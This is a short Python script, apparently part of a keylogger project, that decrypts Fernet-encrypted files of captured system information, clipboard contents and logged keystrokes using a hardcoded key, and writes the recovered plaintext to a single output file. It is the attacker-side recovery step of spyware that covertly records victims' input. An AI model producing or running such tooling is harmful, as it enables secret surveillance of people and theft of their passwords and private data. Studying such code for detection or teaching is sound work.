from cryptography.fernet import Fernet

# To decrypt our files we use the same encryption key created via GenerateEncryptionKey.py

key = "ZUIRz9a1FWoxPE2bHGEol8MGDARZTyPoufWOrFQR-iw="

e_system_information = 'e_system.txt'
e_clipboard_information = 'e_clipboard.txt'
e_keys_information = 'e_keys_logged.txt'

# Complies our encrypted files into a list
encrypted_files = [e_system_information,
                   e_clipboard_information, e_keys_information]
count = 0


for decrypting_files in encrypted_files:
    # Reads each encrypted file 1 by 1
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()
# Decrypts the file using the generated key
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)
    count += 1
